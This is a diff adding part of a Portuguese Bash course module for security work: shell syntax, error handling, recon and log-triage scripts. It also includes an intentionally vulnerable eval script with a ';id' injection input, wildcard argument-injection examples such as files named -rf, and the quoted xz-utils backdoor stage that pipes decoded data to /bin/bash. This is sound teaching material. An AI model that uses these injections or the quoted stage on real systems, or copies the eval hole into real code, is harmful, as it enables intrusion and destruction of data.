+| `$#` | Quantos argumentos vieram |
+| `"$@"` | Todos os argumentos, **cada um como uma palavra intacta** |
+| `"$*"` | Todos os argumentos juntos numa palavra só |
+| `$?` | O código de saída do último comando |
+| `$$` | O <GlossaryTerm term="PID">PID</GlossaryTerm> do shell que roda o script |
+
+A diferença entre `"$@"` e `$*` aparece com argumentos que têm espaço. Um script de
+teste, rodado no sandbox (saída real):
+
+```bash
+#!/usr/bin/env bash
+echo "\$# = $#"
+for a in "$@"; do echo "  \"\$@\": [$a]"; done
+for a in $*; do echo "  \$*:   [$a]"; done
+```
+
+```console
+$ ./args.sh "192.168.0.10" "relatorio final.txt"
+$# = 2
+  "$@": [192.168.0.10]
+  "$@": [relatorio final.txt]
+  $*:   [192.168.0.10]
+  $*:   [relatorio]
+  $*:   [final.txt]
+```
+
+Dois argumentos entraram; com `"$@"` saíram dois, com `$*` saíram três. A regra é a
+mesma da seção anterior: `"$@"`, com aspas, sempre. O `shift` descarta o `$1` e move os
+demais uma posição para a esquerda; é útil para tratar opções no começo e deixar o
+resto em `"$@"`.
+
+### 2.4 Decisões: códigos de saída, test, if e case
+
+Em Python ou C, o `if` testa uma expressão verdadeira ou falsa. No shell, o `if` testa
+um **comando**: se o código de saída for 0, a condição é verdadeira. Essa é a peça que
+liga tudo:
+
+```bash
+if grep -q 'Status: Up' varredura.gnmap; then
+    echo "pelo menos um host respondeu"
+fi
+```
+
+O `grep -q` não imprime nada; só devolve 0 se achou e 1 se não achou. Isso é uma
+<GlossaryTerm term="conditional">condicional</GlossaryTerm> (*conditional*): um bloco que
+só roda se a condição for verdadeira, com `elif` e `else` opcionais.
+
+Para testar arquivos, números e textos existe um comando próprio, o
+<GlossaryTerm term="test command">test</GlossaryTerm>, que também se escreve `[`. Sim,
+`[` é um comando, e por isso precisa de espaço depois dele, como qualquer comando
+precisa de espaço antes dos argumentos:
+
+```console
+$ x=5
+$ [$x -gt 3]
+bash: [5: command not found
+```
+
+O Bash juntou `[` com o valor de `$x` e procurou um comando chamado `[5`. Escrito certo:
+`[ "$x" -gt 3 ]`, com espaço dos dois lados e o `]` como último argumento. Os testes que
+você vai usar o tempo todo:
+
+| Teste | Verdadeiro se... |
+|---|---|
+| `[ -e caminho ]` / `-f` / `-d` | existe / é arquivo comum / é diretório |
+| `[ -r caminho ]` / `-w` / `-x` | você pode ler / escrever / executar |
+| `[ -z "$s" ]` / `[ -n "$s" ]` | o texto é vazio / não é vazio |
+| `[ "$a" = "$b" ]` / `!=` | textos iguais / diferentes |
+| `[ "$n" -eq 3 ]` / `-ne -lt -le -gt -ge` | comparações de **números** |
+
+Atenção aos dois mundos: `=` compara **texto** e `-eq` compara **números**. E sempre com
+aspas: com uma variável vazia e sem aspas, `[ $resposta = sim ]` vira `[ = sim ]`, e o
+`test` reclama (saída real):
+
+```console
+$ resposta=""
+$ if [ $resposta = sim ]; then echo sim; fi
+bash: [: =: unary operator expected
+```
+
+O Bash tem também o `[[ ... ]]`, uma palavra reservada (não um comando). Dentro dele
+não há word splitting nem globs, então variáveis sem aspas não quebram, e ele aceita
+`&&`, `||` e expressões regulares com `=~`. É o que você deve preferir em scripts
+Bash. O `[ ]` existe porque é <GlossaryTerm term="POSIX">POSIX</GlossaryTerm>: o conjunto
+de padrões que define como um shell tipo Unix (`sh`) deve se comportar, e que todo shell
+compatível segue. Um script POSIX roda em qualquer `sh`; um script com `[[` precisa do
+Bash. Voltaremos a isso na Missão 3.
+
+**Listas com `&&` e `||`.** `cmd1 && cmd2` roda o segundo só se o primeiro deu certo;
+`cmd1 || cmd2`, só se falhou. São condicionais de uma linha:
+
+```bash
+[ -r "$arquivo" ] || { echo "não consigo ler $arquivo" >&2; exit 3; }
+```
+
+As chaves `{ ...; }` agrupam comandos sem criar subshell (o `exit` sai do script, não de
+uma cópia). O `>&2` manda a mensagem para o
+<GlossaryTerm term="stderr">stderr</GlossaryTerm>: mensagens de erro vão para o canal de
+erro, e o <GlossaryTerm term="stdout">stdout</GlossaryTerm> fica limpo para os
+resultados, que podem seguir por um pipe.
+
+**case.** Quando um valor pode ter muitas formas, o
+<GlossaryTerm term="case statement">case</GlossaryTerm> (*case statement*) compara com
+padrões, na ordem, e executa o bloco do primeiro que casar. Os padrões aceitam curingas:
+
+```bash
+case $porta in
+    80|8080)   esquema=http ;;
+    443|8443)  esquema=https ;;
+    *)         esquema="" ;;    # qualquer outra coisa
+esac
+```
+
+Cada bloco termina com `;;`. O `*)` no fim é o "senão". É a estrutura certa para decidir
+por porta, extensão de arquivo ou opção de linha de comando.
+
+### 2.5 Repetição: for, while e a leitura de linhas
+
+Um <GlossaryTerm term="loop">laço</GlossaryTerm> (*loop*) repete um bloco. O `for`
+percorre uma lista de palavras:
+
+```bash
+for ip in 192.168.0.{1..5}; do
+    echo "alvo: $ip"
+done
+
+for f in "$dir"/*.log; do      # um item por arquivo, mesmo com espaço no nome
+    echo "log: $f"
+done
+```
+
+O `while` repete enquanto um comando der certo. O uso mais importante dele em
+segurança é **ler um arquivo linha por linha**:
+
+```bash
+while IFS= read -r linha; do
+    echo "[$linha]"
+done < lista.txt
+```
+
+Cada parte tem um motivo:
+
+- `read` lê **uma linha** do stdin e guarda na variável; devolve falha no fim do
+  arquivo, o que encerra o `while`.
+- `IFS=` (vazio, só para este comando) impede o `read` de cortar espaços do começo e do
+  fim da linha.
+- `-r` impede o `read` de tratar `\` como caractere de escape. Sem ele, um caminho do
+  Windows perde as barras:
+
+```console
+$ printf 'C:\\temp\\nova\n' | { read linha; echo "sem -r: $linha"; }
+sem -r: C:tempnova
+$ printf 'C:\\temp\\nova\n' | { read -r linha; echo "com -r: $linha"; }
+com -r: C:\temp\nova
+```
+
+- `< lista.txt` no `done` redireciona o arquivo para o stdin do laço inteiro.
+
+**Por que não `for linha in $(cat lista.txt)`?** Porque o `for` percorre **palavras**,
+não linhas: o resultado de `$(cat ...)` sem aspas passa pelo word splitting. Saída real
+com um arquivo de duas linhas:
+
+```console
+$ for l in $(cat lista.txt); do echo "[$l]"; done
+[linha]
+[um]
+[linha]
+[dois]
+$ while IFS= read -r l; do echo "[$l]"; done < lista.txt
+[linha um]
+[linha dois]
+```
+
+O `read` também separa campos: com várias variáveis, ele quebra a linha usando o `IFS`
+e põe um pedaço em cada uma; a última recebe o resto. Com `IFS=/`, a entrada
+`8080/open/tcp//http-proxy///` vira `port=8080`, `state=open` e o resto. Esse truque é
+a base da Missão 2.
+
+Dentro de laços, `continue` pula para a próxima volta e `break` sai do laço.
+
+### 2.6 Funções e escopo
+
+Uma <GlossaryTerm term="shell function">função</GlossaryTerm> (*shell function*) é um
+bloco com nome que você chama como se fosse um comando. Ela recebe argumentos em `$1`,
+`$2`... (os do script ficam escondidos durante a chamada) e devolve um **código de
+saída** com `return`, não um valor:
+
+```bash
+uso() {
+    echo "uso: $0 ARQUIVO.gnmap" >&2
+    exit 2
+}
+
+eh_par() {
+    (( $1 % 2 == 0 ))    # (( )) devolve 0 se a conta for verdadeira
+}
+```
+
+```console
+$ for n in 3 4; do if eh_par "$n"; then echo "$n é par"; else echo "$n é ímpar"; fi; done
+3 é ímpar
+4 é par
+```
+
+Para "devolver" um texto, a função o imprime, e quem chama captura com `$( )`:
+`ip=$(extrair_ip "$linha")`.
+
+**Escopo.** Por padrão, toda variável do Bash é global: uma função que faz `contador=99`
+muda o `contador` do script inteiro. Para evitar isso, declare as variáveis da função
+com `local`, criando uma <GlossaryTerm term="local variable">variável local</GlossaryTerm>.
+Saída real:
+
+```bash
+contador=0
+sem_local() { contador=99; }
+com_local() { local contador=7; echo "dentro: $contador"; }
+com_local; echo "depois de com_local: $contador"
+sem_local; echo "depois de sem_local: $contador"
+```
+
+```console
+$ bash escopo.sh
+dentro: 7
+depois de com_local: 0
+depois de sem_local: 99
+```
+
+### 2.7 Robustez: set -euo pipefail, trap e mktemp
+
+Por padrão, o Bash é tolerante demais para um script: um comando falha e ele segue para
+a próxima linha; uma variável não existe e ela vira vazia; um comando no meio de um pipe
+falha e ninguém fica sabendo. Três opções mudam isso, e quase todo script sério começa
+com elas:
+
+```bash
+set -euo pipefail
+```
+
+- `-e` (<GlossaryTerm term="errexit">errexit</GlossaryTerm>): se um comando falhar, o
+  script termina na hora, com o código da falha.
+- `-u` (<GlossaryTerm term="nounset">nounset</GlossaryTerm>): usar uma variável não
+  definida é erro, e o script termina.
+- `-o pipefail` (<GlossaryTerm term="pipefail">pipefail</GlossaryTerm>): o código de um
+  pipeline passa a ser o do último comando que falhou, em vez de sempre o do último
+  comando.
+
+Saídas reais:
+
+```console
+$ bash -c 'set -u; echo "inicio"; echo "$destino"; echo fim'
+inicio
+bash: line 1: destino: unbound variable
+$ bash -c 'false | true; echo "sem pipefail: $?"'
+sem pipefail: 0
+$ bash -c 'set -o pipefail; false | true; echo "com pipefail: $?"'
+com pipefail: 1
+```
+
+**Os pontos cegos do `set -e`.** O manual é explícito: o shell **não** termina se o
+comando que falhou faz parte do teste de um `if`, `elif`, `while` ou `until`, de uma lista
+com `&&` ou `||` (exceto o último comando), de um pipeline (exceto o último), ou se o
+código foi invertido com `!`. E tudo o que roda dentro de uma função chamada nesses
+lugares também fica sem a proteção. Veja um script real:
+
+```bash
+#!/usr/bin/env bash
+set -e
+checar() { false; echo "checar continuou depois do false"; }
+if checar; then echo "if: checar deu certo"; fi
+checar && echo "&&: tambem"
+echo "--- agora fora do if"
+checar
+echo "esta linha nunca aparece"
+```
+
+```console
+$ bash sete.sh; echo "rc=$?"
+checar continuou depois do false
+if: checar deu certo
+checar continuou depois do false
+&&: tambem
+--- agora fora do if
+rc=1
+```
+
+Dentro do `if` e do `&&`, a função seguiu depois do `false` e ainda "deu certo" (o
+código dela foi o do `echo`). Só na chamada solta o `set -e` agiu.
+
+<Figure
+  src={errosQueSomem}
+  alt="Diagrama em duas partes. Na primeira, um pipeline grep, sort, head: o grep falhou com código 2, os outros deram 0. Sem pipefail, o código final é 0 e o erro some; com pipefail, é 2. Na segunda parte, à esquerda, os lugares onde o set -e é ignorado: teste do if e do while, tudo antes do último comando de listas com && e ||, depois de exclamação, todo comando do pipeline menos o último, e tudo dentro de uma função chamada nesses lugares. À direita, onde ele age: comando sozinho na linha e atribuição simples. Embaixo, o caso real da Missão 3: dois erros do grep e código de saída 0."
+  caption="Os três mecanismos de erro se completam, mas cada um tem pontos cegos. set -euo pipefail não substitui testar o código de saída onde ele importa."
+/>
+
+**trap: limpar ao sair.** O <GlossaryTerm term="trap">trap</GlossaryTerm> que você usou
+no 0.4 como <GlossaryTerm term="signal handler">signal handler</GlossaryTerm> também
+aceita o evento `EXIT`, que dispara quando o script termina, por qualquer motivo: fim
+normal, `exit`, erro com `set -e` ou Ctrl+C. É o lugar certo para apagar arquivos
+temporários:
+
+```bash
+#!/usr/bin/env bash
+set -euo pipefail
+tmp=$(mktemp)
+trap 'rm -f "$tmp"; echo "limpeza: apaguei $tmp"' EXIT
+echo "trabalhando em $tmp"
+false
+echo "nunca chega aqui"
+```
+
+```console
+$ bash limpeza.sh; echo "rc=$?"
+trabalhando em /tmp/tmp.utv1qnUccN
+limpeza: apaguei /tmp/tmp.utv1qnUccN
+rc=1
+```
+
+**mktemp: arquivos temporários seguros.** O
+<GlossaryTerm term="mktemp">mktemp</GlossaryTerm> cria um arquivo com nome imprevisível e
+permissão só para o dono (`-rw-------`, saída real abaixo). A alternativa ingênua,
+`/tmp/meu-script.tmp`, tem um nome que qualquer usuário da máquina pode prever. Como o
+`/tmp` é gravável por todos (com o <GlossaryTerm term="sticky bit">sticky bit</GlossaryTerm>
+do 0.3), um atacante local pode criar antes um
+<GlossaryTerm term="symlink">symlink</GlossaryTerm> com esse nome apontando para um
+arquivo seu: quando o script escrever no "temporário", estará escrevendo no arquivo
+apontado. Esse tipo de falha, que depende de quem chega primeiro, é uma
+<GlossaryTerm term="race condition">race condition</GlossaryTerm> (condição de corrida).
+
+```console
+$ t=$(mktemp); ls -l "$t"; rm -f "$t"
+-rw------- 1 aluno aluno 0 Oct  3 09:10 /tmp/tmp.bCLZzt9Lyr
+```
+
+**Ver o script rodar: `bash -x`.** A opção <GlossaryTerm term="xtrace">xtrace</GlossaryTerm>
+(`set -x` dentro do script, ou `bash -x script.sh`) mostra cada comando **depois** das
+expansões, precedido de `+`. É a ferramenta número um para descobrir por que um script
+não faz o que você esperava, porque mostra exatamente o que o Bash executou:
+
+```console
+$ bash -x -c 'alvo="192.168.0.10"; porta=80; echo "testando $alvo:$porta"'
++ alvo=192.168.0.10
++ porta=80
++ echo 'testando 192.168.0.10:80'
+testando 192.168.0.10:80
+```
+
+E para checar só a sintaxe, sem executar nada, há o `bash -n script.sh`, útil antes de
+rodar um script que apaga ou altera coisas.
+
+## 3. Na prática da segurança
+
+Agora que você sabe o que acontece por dentro, veja como o Bash aparece no trabalho de
+quem ataca e de quem defende.
+
+### 3.1 Automatizar o reconhecimento
+
+O <GlossaryTerm term="reconnaissance">reconhecimento</GlossaryTerm> (*reconnaissance*, ou
+*recon*) é a fase em que se descobre o que existe no escopo: quais hosts respondem, que
+portas estão abertas, que serviços rodam. Ferramentas como o nmap (Trilha 2) fazem a
+coleta; o script faz o resto: filtrar, cruzar, transformar e registrar.
+
+Um exemplo típico: o nmap gera a lista de portas abertas (a
+<GlossaryTerm term="port scanning">varredura de portas</GlossaryTerm> que você conheceu
+no 0.2), e o próximo passo precisa da lista de **URLs** dos serviços web, para passá-la
+a outra ferramenta. Fazer isso à mão para 30 hosts é a receita do erro. O nmap tem um
+formato pensado para scripts, a
+<GlossaryTerm term="grepable output">grepable output</GlossaryTerm> (`-oG`): uma linha por
+host, com campos separados por tab. Este é o exemplo da documentação oficial do nmap,
+para um único host:
+
+```text
+Host: 64.13.134.52 (scanme.nmap.org)	Ports: 22/open/tcp//ssh//OpenSSH 4.3 (protocol 2.0)/, 25/closed/tcp//smtp///, 53/open/tcp//domain///, 80/open/tcp//http//Apache httpd 2.2.3 ((CentOS))/, ...
+```
+
+Cada porta tem sete subcampos separados por `/`: número, estado, protocolo, dono
+(*owner*), serviço, informação de RPC e versão. Subcampos sem informação ficam vazios,
+por isso aparecem as barras duplas. A documentação marca esse formato como
+*deprecated* (obsoleto, em favor do XML), mas ele continua muito usado justamente
+porque é fácil de tratar com `grep`, `cut` e `read`, como você fará na Missão 2.
+
+O esqueleto de quase todo script de recon é o mesmo: **validar a entrada, extrair,
+decidir, emitir uma linha por resultado**. Emitir uma linha por resultado no stdout
+deixa o script combinável: a saída dele vira a entrada de `sort`, `wc -l` ou `tee`.
+
+<Figure
+  src={fluxoRecon}
+  alt="Fluxo do script urls-web.sh. O arquivo varredura.gnmap entra; o passo 1 valida a entrada e, sem arquivo, para com erro no stderr e código diferente de zero; o passo 2, grep Ports, descarta as outras linhas. Um laço externo, while IFS=tab read, roda uma vez por host: o passo 3 recorta o IP com expansões de parâmetro e o passo 4 troca vírgula e espaço por quebra de linha. Um laço interno, while IFS=barra read, roda uma vez por porta: o passo 5 pula as que não estão abertas, o passo 6 é um case que monta http://IP/, https://IP/, http://IP:8080/ ou https://IP:8443/, e o passo 7 emite uma URL por linha no stdout, para sort, wc ou tee."
+  caption="O esqueleto de um script de recon: validar, extrair, decidir e emitir uma linha por resultado. É o script da Missão 2."
+/>
+
+### 3.2 Triagem de logs: achar o atacante no meio do ruído
+
+Do lado da defesa, o mesmo raciocínio serve para ler <GlossaryTerm term="log">logs</GlossaryTerm>.
+Todo servidor web grava um <GlossaryTerm term="access log">access log</GlossaryTerm>,
+uma linha por requisição. O formato mais comum é o
+<GlossaryTerm term="Combined Log Format">Combined Log Format</GlossaryTerm> do Apache.
+Este é o exemplo da documentação oficial:
+
+```text
+127.0.0.1 - frank [10/Oct/2000:13:55:36 -0700] "GET /apache_pb.gif HTTP/1.0" 200 2326 "http://www.example.com/start.html" "Mozilla/4.08 [en] (Win98; I ;Nav)"
+```
+
+Os campos são, na ordem: IP do cliente, identidade (quase sempre `-`), usuário
+autenticado, data entre colchetes, a requisição entre aspas (método, caminho e
+protocolo), o <GlossaryTerm term="status code">status code</GlossaryTerm> (0.2), o
+tamanho da resposta em bytes, a página de origem (*referer*) e o
+<GlossaryTerm term="user agent">user agent</GlossaryTerm>, o texto com que o cliente se
+identifica.
+
+Uma técnica de reconhecimento web muito comum é o
+<GlossaryTerm term="directory brute forcing">directory brute forcing</GlossaryTerm>: uma
+ferramenta pede ao servidor centenas de caminhos de uma
+<GlossaryTerm term="wordlist">wordlist</GlossaryTerm> (`/admin`, `/backup.zip`, `/.git/HEAD`)
+para descobrir os que existem. Como a maioria não existe, a varredura deixa no log uma
+rajada de respostas 404 vindas de um mesmo IP em poucos segundos, muitas vezes com o
+user agent padrão da ferramenta (o gobuster, por exemplo, se identifica como
+`gobuster/` seguido da versão, segundo o próprio código-fonte). Contar 404 por IP é uma
+das primeiras triagens que um analista faz:
+
+```bash
+awk '$9 == 404 { print $1 }' access.log | sort | uniq -c | sort -rn | head
+```
+
+O `awk` (presente no sandbox) separa a linha em campos pelos espaços: `$1` é o IP e
+`$9` é o status. O resto você conhece do 0.3. Cuidado com o atalho `grep " 404 "`: ele
+casa o texto ` 404 ` em **qualquer** lugar da linha, inclusive no campo do tamanho de
+uma resposta que tinha exatamente 404 bytes. É um
+<GlossaryTerm term="false positive">falso positivo</GlossaryTerm> (*false positive*)
+clássico, e a Missão 3 foi montada em cima dele.
+
+### 3.3 Registrar o que foi feito
+
+Num pentest, um resultado sem registro é um resultado que não aconteceu. Scripts tornam
+o registro automático: cada execução pode gravar a data, o comando e a saída.
+
+```bash
+log="evidencias-$(date +%F).log"
+{
+    echo "### $(date '+%F %T') — $0 $*"
+    ./urls-web.sh varredura.gnmap
+} | tee -a "$log"
+```
+
+O `{ ...; }` agrupa a saída dos dois comandos num único fluxo, e o `tee -a` (0.3) mostra
+na tela e acrescenta ao arquivo. Um script também é, ele mesmo, documentação: anexado ao
+relatório, mostra exatamente como cada achado foi obtido e permite que o cliente
+reproduza o teste depois da correção.
+
+### 3.4 O mesmo Bash nas mãos de um invasor
+
+O MITRE ATT&CK, a base pública de técnicas de atacantes reais (0.3), tem uma entrada só
+para isso: *Command and Scripting Interpreter: Unix Shell*, a
+[T1059.004](https://attack.mitre.org/techniques/T1059/004/). Os usos mais comuns:
+
+- **Baixar e executar.** Um invasor que consegue rodar um comando costuma usá-lo para
+  baixar um script maior e passá-lo direto ao `bash`, sem gravar no disco. É o mesmo
+  padrão `curl ... | bash` que o 0.3 mostrou no caso Codecov.
+- **Persistência com o <GlossaryTerm term="cron">cron</GlossaryTerm>.** O cron é o
+  serviço do Linux que executa comandos em horários programados, configurado por um
+  arquivo chamado crontab. Administradores o usam para backups e rotinas; invasores, para
+  que o script deles volte a rodar a cada poucos minutos, mesmo que o processo seja
+  encerrado. O ATT&CK registra a técnica como
+  [T1053.003](https://attack.mitre.org/techniques/T1053/003/). Os
+  <GlossaryTerm term="shell startup file">arquivos de inicialização do shell</GlossaryTerm>
+  que o 0.4 mostrou são outro esconderijo.
+- **Ofuscação.** Para passar despercebido por pessoas e ferramentas de defesa, o script
+  é codificado, comprimido ou embaralhado, e só é decodificado na hora de rodar. Isso é
+  <GlossaryTerm term="obfuscation">ofuscação</GlossaryTerm> (*obfuscation*), técnica
+  [T1027](https://attack.mitre.org/techniques/T1027/). O sinal típico é um pipeline que
+  termina em `| bash` ou `| sh` depois de `base64 -d`, `tr` ou um descompressor. O caso
+  real do xz, na seção 4, é um exemplo de manual.
+
+Para quem defende, a consequência prática é: **saber ler scripts de shell é saber ler a
+evidência**. Um crontab estranho, uma linha nova no `.bashrc` ou um arquivo `.sh` em
+`/tmp` são os primeiros lugares que um analista abre numa máquina comprometida.
+
+### 3.5 Quando o script é a falha: injeção
+
+Um script que recebe dados de fora (argumentos, nomes de arquivo, linhas de um log, um
+campo de formulário web que chega até ele) precisa tratar esses dados como **dados**.
+Quando um valor acaba sendo lido pelo shell como **código**, temos uma
+<GlossaryTerm term="command injection">command injection</GlossaryTerm>. É a mesma
+família de falha da Shellshock, que você viu no 0.4, e a mesma que a Trilha 4 vai
+explorar em aplicações web.
+
+A forma mais direta de criar essa falha é o
+<GlossaryTerm term="eval">eval</GlossaryTerm>, um builtin que junta os argumentos num
+texto e manda o shell executá-lo como código. Este script vulnerável foi rodado no
+sandbox (saída real):
+
+```bash
+#!/usr/bin/env bash
+# VERSÃO INSEGURA: monta um comando como texto e manda o shell interpretar.
+alvo=$1
+eval "echo Testando o host $alvo"
+```
+
+```console
+$ ./checar-host.sh 192.168.0.10
+Testando o host 192.168.0.10
+$ ./checar-host.sh '192.168.0.10; id'
+Testando o host 192.168.0.10
+uid=1000(aluno) gid=1000(aluno) groups=1000(aluno)
+```
+
+O `;` era só um caractere do argumento. O `eval` fez o shell reler o texto, e o `;`
+virou um separador de comandos: rodou o `echo` **e** o `id`. No lugar do `id`, poderia
+estar qualquer coisa, com os privilégios de quem roda o script. Se o script rodar como
+root, ou for chamado por um servidor web, o estrago é proporcional.
+
+<Figure
+  src={injecao}
+  alt="Diagrama em duas partes. Inseguro: o argumento 192.168.0.10; id entra, o script monta o texto echo Testando o host 192.168.0.10; id e o entrega ao eval; o shell relê o texto, o ponto e vírgula vira separador, e rodam o echo e o id, que imprime uid=1000(aluno). Seguro: o mesmo argumento passa por uma validação de IPv4 com expressão regular, é recusado com código 2 e a mensagem não parece um IPv4; uma nota explica que, sem eval e com aspas, a variável seria um único argumento e nunca seria relida."
+  caption="A injeção acontece quando um dado é lido de novo como código. A defesa tem duas camadas: validar a entrada e nunca deixar o shell reler o dado (sem eval, com aspas)."
+/>
+
+Há uma variante mais sutil, em que o dado não vira um comando novo, mas uma **opção** do
+comando: a <GlossaryTerm term="argument injection">argument injection</GlossaryTerm>.
+Lembre que os curingas são expandidos pelo shell **antes** de o comando rodar (0.3). Se
+alguém consegue criar numa pasta um arquivo chamado `-l`, o `ls *` dessa pasta recebe
+`-l` como opção (saída real, numa pasta com `a.txt`, `b.txt` e um arquivo chamado
+`-l`):
+
+```console
+$ ls *
+-rw-r--r-- 1 aluno aluno 0 Oct  3 09:10 a.txt
+-rw-r--r-- 1 aluno aluno 0 Oct  3 09:10 b.txt
+$ ls -- *
+-l
+a.txt
+b.txt
+```
+
+No primeiro comando, o `ls` "virou" `ls -l` sem que ninguém digitasse `-l`. Com um `ls`,
+isso é inofensivo. O pesquisador Leon Juranic, da DefenseCode, publicou em 25 de junho
+de 2014 o artigo *Back To The Future: Unix Wildcards Gone Wild*, mostrando a mesma ideia
+com comandos perigosos: um arquivo chamado `-rf` transformando um `rm *` num `rm -rf`,
+e nomes de arquivo que viram opções do `chown`, do `chmod`, do `tar` e do `rsync`, até
+executar comandos. O ataque funciona quando um script privilegiado (um backup do root no
+cron, por exemplo) roda um desses comandos com `*` numa pasta onde um usuário comum pode
+criar arquivos. É um caminho clássico de
+<GlossaryTerm term="privilege escalation">privilege escalation</GlossaryTerm>, que a Trilha 6
+vai explorar. A defesa é o `--` do segundo comando: pela Diretriz 10 da sintaxe de
+utilitários do POSIX, o primeiro `--` marca o fim das opções, e tudo o que vem depois é
+tratado como nome, mesmo começando com `-`. Usar `./*` no lugar de `*` também resolve,
+porque `./-rf` não começa com `-`. Fonte: [o artigo, no arquivo do Exploit-DB](https://www.exploit-db.com/papers/33930).
+
+## 4. Casos reais — o que aconteceu no mundo
+
+Os scripts de shell estão no meio de alguns dos erros mais caros e de alguns dos ataques
+mais engenhosos da história do Linux. O 0.3 já contou o caso do Steam para Linux (janeiro
+de 2015, uma variável vazia num `rm -rf`) e o do Codecov (2021, um script de envio
+alterado para roubar segredos de <GlossaryTerm term="CI">CI</GlossaryTerm>). Aqui vão
+dois outros, verificados nas fontes primárias.
+
+### Bumblebee (24 de maio de 2011): um espaço que apagou o /usr
+
+O Bumblebee era um projeto livre que levava ao Linux o suporte ao NVIDIA Optimus, a
+tecnologia de notebooks que alterna entre duas placas de vídeo. A instalação era feita
+por um script, o `install.sh`, que se recusava a rodar sem privilégios e pedia, no Ubuntu,
+para ser chamado com `sudo install.sh`, isto é, como root.
+
+Na versão 1.4.31, dentro de um `case` que tratava cada distribuição, a linha 351 do
+script era esta:
+
+```bash
+rm -rf /usr /lib/nvidia-current/xorg/xorg
+```
+
+A intenção era apagar `/usr/lib/nvidia-current/xorg/xorg`. Mas havia um espaço entre
+`/usr` e `/lib`. Você já sabe o que o Bash faz com isso no primeiro passo da leitura: a
+linha vira palavras, e o `rm` recebeu **dois** argumentos, `/usr` e
+`/lib/nvidia-current/xorg/xorg`. Como root, com `-rf`, ele apagou o `/usr` inteiro, onde
+moram quase todos os programas do sistema.
+
+- **24 de maio de 2011, 05:01 (UTC):** um usuário abriu a issue #123 no GitHub do
+  projeto, com o título *install script does rm -rf /usr for ubuntu*, apontando o
+  espaço extra na linha 351 e contando que precisou reinstalar o Linux.
+- **05:54 (UTC) do mesmo dia:** o autor publicou a correção, a versão 1.4.32, num
+  commit com a mensagem *"GIANT BUG... causing /usr to be deleted... so sorry...."*. A
+  diferença é exatamente um espaço: `rm -rf /usr/lib/nvidia-current/xorg/xorg`.
+- **06:02 (UTC):** a issue foi fechada. Antes disso, às 05:39, outro usuário já tinha
+  comentado que o mesmo acontecera com ele. Nos anos seguintes, a issue virou uma lenda
+  da internet e acumulou dezenas de comentários de curiosos.
+
+- **Impacto:** quem instalou a versão com o bug perdeu o `/usr`, ou seja, o sistema
+  deixou de funcionar e precisou ser reinstalado ou recuperado. O projeto corrigiu em
+  menos de uma hora, mas um script que roda como root não dá segunda chance a quem já o
+  executou.
+- **Lição:** o Bash quebra as linhas em palavras pelos espaços **antes** de qualquer
+  outra coisa, e o `rm` faz exatamente o que recebe. As defesas que você vai ver na
+  seção 8 atacam isso por vários lados: caminhos em variáveis com aspas e `${var:?}`,
+  `--` antes dos nomes, testar o script como usuário comum num ambiente descartável (como
+  o sandbox) antes de rodar como root, e revisar com o ShellCheck.
+- **Fontes:** [issue #123 no GitHub do projeto](https://github.com/MrMEEE/bumblebee-Old-and-abbandoned/issues/123);
+  [commit da correção, a047be8](https://github.com/MrMEEE/bumblebee-Old-and-abbandoned/commit/a047be85247755cdbe0acce6f1dafc8beb84f2ac).
+
+### O backdoor do xz-utils (29 de março de 2024): o ataque escondido em scripts de build
+
+O 0.4 contou este caso pelo lado do processo: um engenheiro, Andres Freund, notou que
+logins por SSH estavam meio segundo mais lentos, investigou e descobriu um
+<GlossaryTerm term="backdoor">backdoor</GlossaryTerm> nas versões 5.6.0 e 5.6.1 do xz,
+registrado como CVE-2024-3094. Aqui interessa a outra metade da história: **como** o
+código malicioso entrava no programa. A resposta é uma cadeia de scripts de shell.
+
+Segundo o relato de Freund na lista oss-security, de 29 de março de 2024:
+
+- Os <GlossaryTerm term="tarball">tarballs</GlossaryTerm> publicados (os pacotes de
+  código-fonte que as distribuições baixam) tinham uma linha a mais num arquivo de
+  apoio da compilação, o `build-to-host.m4`. Essa linha **não** existia no repositório
+  git do projeto, só nos tarballs, e por isso escapava de quem revisava o código no git.
+- Essa linha injetava, nas palavras dele, "um script ofuscado, executado no fim do
+  `configure`" (o script que prepara a compilação).
+- Os dados desse script vinham de dois arquivos de **teste** do repositório, com nomes
+  inocentes como `bad-3-corrupt_lzma2.xz`, que supostamente eram arquivos corrompidos
+  usados em testes.
+
+O primeiro estágio, citado no relato, é uma linha de shell que você já consegue ler:
+
+```bash
+sed rpath ../../../tests/files/bad-3-corrupt_lzma2.xz | tr "	 \-_" " 	_\-" | xz -d | /bin/bash >/dev/null 2>&1
+```
+
+Pedaço por pedaço: o arquivo de "teste" é lido; o `tr` troca caracteres entre si (tab
+por espaço, `-` por `_` e vice-versa), desfazendo a "corrupção" proposital; o `xz -d`
+descomprime o resultado; e o texto que sai é entregue direto ao `/bin/bash`, com toda a
+saída jogada fora. O arquivo "corrompido" era, na verdade, um script comprimido e
+embaralhado. Esse script, por sua vez, extraía de outro arquivo de teste o código
+compilado do backdoor e o enfiava na biblioteca durante a compilação. É ofuscação em
+camadas, todas feitas com ferramentas comuns do sistema e um pipeline terminando em
+`| bash`.
+
+- **Impacto:** o backdoor foi feito para entrar nos pacotes `.deb` e `.rpm` das
+  distribuições e, através da `liblzma`, chegar ao servidor SSH. No Debian, o boletim de
+  segurança informou que só as versões de teste e instável tinham os pacotes
+  comprometidos, e nenhuma versão estável era conhecida como afetada (detalhes e datas no
+  0.4).
+- **Lição:** o código que **constrói** o programa é tão crítico quanto o programa, e
+  scripts de build raramente são revisados. Sinais que valem ouro numa revisão:
+  diferenças entre o tarball e o repositório, arquivos "de teste" binários usados pelo
+  build, e qualquer pipeline que decodifica algo e termina em `| bash` ou `| sh`.
+- **Fontes:** [relato de Andres Freund na oss-security](https://www.openwall.com/lists/oss-security/2024/03/29/4);
+  [registro do CVE-2024-3094](https://www.cve.org/CVERecord?id=CVE-2024-3094);
+  [página do projeto XZ Utils sobre o backdoor](https://tukaani.org/xz-backdoor/).
+
+## 5. Mãos à obra — exercícios no sandbox
+
+Este módulo não tem laboratório próprio. Você vai usar o **linux-sandbox** do 0.3 (sem
+rede, sem root, descartável) para as três missões com flag, e o **seu WSL** para um
+walkthrough final com o ShellCheck, que precisa de `sudo` e de internet para ser
+instalado.
+
+**Objetivo:** ao terminar, você terá escrito um script de recon com validação de
+entrada e códigos de saída (Missão 1), um parser que transforma uma varredura do nmap em
+URLs (Missão 2) e terá consertado um script de análise de log que "mente" ao dizer
+quem é o atacante (Missão 3). Cada missão termina numa flag.
+
+### 5.1 Preparação (passo a passo)
+
+1. Abra um terminal do Ubuntu no WSL, entre na pasta do projeto e no sandbox (se a imagem
